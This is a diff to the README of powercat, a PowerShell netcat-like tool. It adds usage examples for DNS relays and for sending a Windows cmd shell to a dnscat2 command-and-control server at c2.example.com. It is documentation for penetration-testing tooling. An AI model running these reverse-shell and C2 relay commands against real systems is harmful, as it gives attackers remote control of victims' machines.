@@ -41,7 +41,7 @@ By default, powercat reads input from the console and writes input to the consol
         powercat -l -p 8000
     Basic Client, Output as Bytes:
         powercat -c 10.1.1.1 -p 443 -o Bytes
-    
+
 File Transfer
 -------------
 powercat can be used to transfer files back and forth using -i (Input) and -of (Output File).
@@ -71,6 +71,8 @@ powercat supports more than sending data over TCP. Specify -u to enable UDP Mode
         powercat -l -p 8000 -u
     Connect to the c2.example.com dnscat2 server using the DNS server on 10.1.1.1:
         powercat -c 10.1.1.1 -p 53 -dns c2.example.com
+    Send a shell to the c2.example.com dnscat2 server using the default DNS server in Windows:
+        powercat -dns c2.example.com -e cmd
 
 Relays
 ------
@@ -82,6 +84,8 @@ Relays in powercat work just like traditional netcat relays, but you don't have 
         powercat -l -p 8000 -r udp:10.1.1.16:53
     TCP Listener to DNS Client Relay
         powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
+    TCP Listener to DNS Client Relay using the Windows Default DNS Server
+        powercat -l -p 8000 -r dns:::c2.example.com
 
 Generate Payloads
 -----------------
